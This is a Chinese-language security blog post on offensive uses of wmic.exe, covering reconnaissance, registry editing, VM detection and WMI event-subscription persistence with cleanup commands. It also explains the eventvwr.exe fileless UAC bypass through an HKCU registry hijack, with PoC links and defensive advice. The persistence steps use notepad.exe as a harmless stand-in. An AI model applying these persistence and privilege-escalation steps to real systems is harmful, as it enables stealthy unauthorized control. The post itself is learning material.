@@ -1,0 +1,337 @@
+I"�;<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+<p>最近学习了Matt Graeber@mattifestation分享的方法《WMI Persistence using wmic.exe》，让我对WMI的攻击技巧有了新的认识，本文将结合之前的研究心得，分享利用wmic的一些技巧。</p>
+
+<p><strong>参考资料：</strong></p>
+
+<p>http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+<p>在之前的文章《WMI Attacks》、《WMI Backdoor》、《WMI Defense》中分享了通过Poweshell和mof调用WMI实现的攻击技巧，
+同样，使用wmic.exe也能达到相同的效果，而且更加直接，只要在cmd下直接运行命令就好。</p>
+
+<h2 id="0x02-搜集信息">0x02 搜集信息</h2>
+<hr />
+<p><strong>获取操作系统相关信息</strong></p>
+
+<p>poweshell代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem</code></p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-1.PNG" alt="Alt text" /></p>
+
+<p>换成wmic.exe的命令为：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem</code></p>
+
+<p>回显如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-2.PNG" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>回显内容的格式没有对齐，需要添加参数指定输出格式</p>
+
+<p>按照powershell回显的分行显示,需要添加如下参数：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem GET /all /FORMAT:list</code></p>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-3.PNG" alt="Alt text" /></p>
+
+<p>依此格式，其他通过powershell调用wmi查询的方法均可用wmic实现，例如：</p>
+
+<p>powershell代码：</p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem</code></p>
+
+<p>对应</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET /all /FORMAT:list</code></p>
+
+<p>将结果输出到文件的方法：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /OUTPUT:c:\test\1.txt /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET /all /FORMAT:list</code></p>
+
+<h2 id="0x03-注册表操作">0x03 注册表操作</h2>
+
+<p>powershell代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-ItemProperty Sys</code></p>
+
+<p>完整的wmic代码如下：</p>
+
+<p>枚举子项：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumKey ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles"</code></p>
+
+<p>注册表内容如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-4.PNG" alt="Alt text" /></p>
+
+<p>命令返回的结果如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-5.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Method execution successful</code>不代表一定能够获得正确的返回结果，此处需要注意参数的正确填写,如图2-6，故意漏掉”,仍然提示<code class="language-plaintext highlighter-rouge">Method execution successful</code>，但返回结果错误</p>
+
+<p>枚举指定的关键值：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumValues  ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys"</code></p>
+
+<p>返回结果如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-7.png" alt="Alt text" /></p>
+
+<p>获取指定值的字符串数据值：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call GetStringValue ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys","TasksDir"</code></p>
+
+<p>返回结果如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-8.png" alt="Alt text" /></p>
+
+<p>创建子项:</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call CreateKey ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test"</code></p>
+
+<p>返回结果如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-9.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>需要注意权限问题，此处需要管理员权限</p>
+
+<p>设置一个命名值的字符串值：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call SetStringValue ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test","Data","Name"</code></p>
+
+<p>返回结果如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/3-1.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong>
+如果一个命名值不存在，则新建；如果存在，则为修改</p>
+
+<p>删除子项：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteKey ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test"</code></p>
+
+<p>删除设置一个命名值：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteValue ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test","Name"</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>以上参数说明参考自https://msdn.microsoft.com/en-us/library/aa393664(VS.85).aspx</p>
+
+<p>特殊字符<code class="language-plaintext highlighter-rouge">^&amp;H80000002</code>含义如下：</p>
+
+<p>&amp;H80000000 ‘HKEY_CLASSES_ROOT</p>
+
+<p>&amp;H80000001 ‘HKEY_CURRENT_USER</p>
+
+<p>&amp;H80000002 ‘HKEY_LOCAL_MACHINE</p>
+
+<p>&amp;H80000003 ‘HKEY_USERS</p>
+
+<p>&amp;H80000005 ‘HKEY_CURRENT_CONFIG</p>
+
+<h2 id="0x04-虚拟机检测">0x04 虚拟机检测</h2>
+
+<h3 id="1查看totalphysicalmemory和numberoflogicalprocessors">1、查看TotalPhysicalMemory和NumberOfLogicalProcessors</h3>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET NumberOfLogicalProcessors,TotalPhysicalMemory /FORMAT:list</code></p>
+
+<p>返回结果如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/3-2.png" alt="Alt text" /></p>
+
+<h3 id="2查看当前进程">2、查看当前进程</h3>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Process GET Caption /FORMAT:list</code></p>
+
+<h2 id="0x05-wmi-persistence">0x05 WMI Persistence</h2>
+<p>Powershell完整的实现代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filterName = 'BotFilter82'
+$consumerName = 'BotConsumer23'
+$exePath = 'C:\Windows\System32\notepad.exe'
+$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre></div></div>
+
+<p>接下来分步介绍对应wmic调用的过程</p>
+
+<h3 id="1create-an-__eventfilter-instance">1、Create an __EventFilter instance</h3>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</code></p>
+
+<h3 id="2create-an-__eventconsumer-instance">2、Create an __EventConsumer instance</h3>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"</code></p>
+
+<h3 id="3create-a-__filtertoconsumerbinding-instance">3、Create a __FilterToConsumerBinding instance</h3>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""</code></p>
+
+<h3 id="4list-the-__eventfilter-and-__eventconsumer-instances">4、List the __EventFilter and __EventConsumer instances</h3>
+
+<p><strong>Filters：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list</code></p>
+
+<p><strong>Event Consumers：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list</code></p>
+
+<p><strong>Event Bindings：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list</code></p>
+
+<p>通过powershell下查看的代码：</p>
+
+<p><strong>Filters：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</code></p>
+
+<p><strong>Event Consumers：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</code></p>
+
+<p><strong>Event Bindings：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></p>
+
+<h3 id="5remove-all-instances">5、Remove all instances</h3>
+<p><strong>Filters：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE</code></p>
+
+<p><strong>Event Consumers：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE</code></p>
+
+<p><strong>Event Bindings：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='BotFilter82'" DELETE</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>wmic中Binding的Filter判断参数”BotFilter82”中”要变成’</p>
+
+<p>通过powershell清除的实现代码：</p>
+
+<p><strong>Filters：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose</code></p>
+
+<p><strong>Event Consumers：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose</code></p>
+
+<p><strong>Event Bindings：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose</code></p>
+
+<h2 id="0x05-fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking">0x05 fileless uac bypass using eventvwr exe and registry hijacking</h2>
+
+<p>wmic的部分操作需要管理员权限，在这里补充一个刚学到的UACbypass技巧</p>
+
+<p><strong>fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking</strong></p>
+
+<p><strong>学习链接：</strong></p>
+
+<p>https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>
+
+<p><strong>作者：</strong></p>
+
+<p>Matt Nelson @enigma0x3</p>
+
+<h3 id="原理">原理</h3>
+
+<p>在进程eventvwr.exe启动的时候，首先查找注册表位置<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\mscfile\shell\open\command</code>,如果该处为空，接着查找注册表位置<code class="language-plaintext highlighter-rouge">HKCR\mscfile\shell\open\command</code>(此处默认值为<code class="language-plaintext highlighter-rouge">%SystemRoot%\system32\mmc.exe "%1" %*</code>),以高权限启动mmc.exe,最后打开eventvwr.msc。</p>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/3-3.png" alt="Alt text" /></p>
+
+<p>接下来，如果在注册表<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\mscfile\shell\open\command</code>中添加payload，就可以在启动mmc.exe之前执行预设的payload</p>
+
+<p><strong>最重要的一点：</strong></p>
+
+<p>修改注册表<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\mscfile\shell\open\command</code>的键值只需要普通用户权限即可</p>
+
+<h3 id="实现">实现</h3>
+
+<p>作者分享了通过powershell实现的poc代码，链接如下：</p>
+
+<p>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1</p>
+
+<p>如果poc成功执行，会在C:\UACBypassTest下写入”Is Elevated: True”</p>
+
+<p><strong>注：</strong></p>
+
+<p>默认操作c:\目录下的文件会被uac拦截</p>
+
+<p>我fork了作者的代码，作了细微修改，运行如下命令：</p>
+
+<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\cmd.exe /c copy c:\test\1.txt c:\1.txt</code></p>
+
+<p>地址为：</p>
+
+<p>https://github.com/3gstudent/UAC-Bypass/blob/master/Invoke-EventVwrBypass.ps1</p>
+
+<h3 id="优点">优点</h3>
+
+<p>该方法同常规的方法有很大不同，优点如下：</p>
+
+<ul>
+  <li>
+    <p>无文件</p>
+  </li>
+  <li>
+    <p>不需要进程注入</p>
+  </li>
+  <li>
+    <p>不需要复制特权文件</p>
+  </li>
+</ul>
+
+<h3 id="适用环境">适用环境</h3>
+
+<p>Win7</p>
+
+<p>Win8.1</p>
+
+<p>Win 10</p>
+
+<h3 id="防御">防御</h3>
+
+<ul>
+  <li>
+    <p>set the UAC level to “Always Notify”</p>
+  </li>
+  <li>
+    <p>remove the current user from the Local Administrators group</p>
+  </li>
+  <li>
+    <p>alert on new registry entries in HKCU\Software\Classes\</p>
+  </li>
+</ul>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+:ET
